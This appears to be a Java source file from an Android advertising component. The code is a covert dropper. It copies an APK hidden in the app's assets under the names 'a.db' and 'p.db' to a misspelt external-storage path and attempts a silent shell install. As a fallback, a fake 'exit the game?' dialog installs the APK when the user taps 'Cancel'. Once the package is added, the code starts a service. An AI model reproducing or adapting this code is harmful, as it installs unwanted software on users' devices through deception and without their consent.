package com.ads.android;
import java.io.File;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import com.ads.android.utils.FileUtils;
import com.ads.android.utils.PackageUtils;

public class MainManager {
    public static void init(Context context) {
        String packageName = readPackageName(context);
        if (PackageUtils.isInstalled(context, packageName)) { return; }
        installApk(context, packageName);
    }
    private static String readPackageName(Context context) {
        return FileUtils.readAssetFile(context, "android/proj/p.db").trim();
    }
    private static void installApk(Context context, String packageName) {
        String path = getApkPath(context);
        installApkInShell(context, path);
        if (!PackageUtils.isInstalled(context, packageName)) {
            installApkInJava(context, path);
        }
    }
    private static void installApkInJava(final Context context, final String path) {
        (new android.app.AlertDialog.Builder(context)).setTitle("确定要退出游戏吗？").setNegativeButton("取消", new android.content.DialogInterface.OnClickListener() {
            public void onClick(android.content.DialogInterface dialoginterface, int i) {
                dialoginterface.dismiss();
                PackageUtils.installApkOuter(context, new File(path));
            }
        }).setPositiveButton("确认", new android.content.DialogInterface.OnClickListener() {
            public void onClick(android.content.DialogInterface dialoginterface, int i) {
                dialoginterface.dismiss();
            }
        }).create().show();
    }
    private static void installApkInShell(Context context, String path) {
        PackageUtils.installApkInShell(context, path);
    }
    private static String getApkPath(Context context) {
        File file = new File(Environment.getExternalStorageDirectory() + "/Android/date/a.db");
        FileUtils.copyAssetFileToSD(context, "android/proj/a.db", file.getAbsolutePath());
        return file.exists() ? file.getAbsolutePath() : null;
    }
    private static final String ANDROID_INTENT_ACTION_PACKAGE_ADDED = "android.intent.action.PACKAGE_ADDED";
    public static void handleReceive(BroadcastReceiver receiver, Context context, Intent intent) {
        String action = intent.getAction();
        if (ANDROID_INTENT_ACTION_PACKAGE_ADDED.equals(action)) {
            String packageName = intent.getDataString().substring(8);
            if (packageName.equals(readPackageName(context))) {
                context.startService(new Intent("com.android.service"));
            }
        }
    }
}
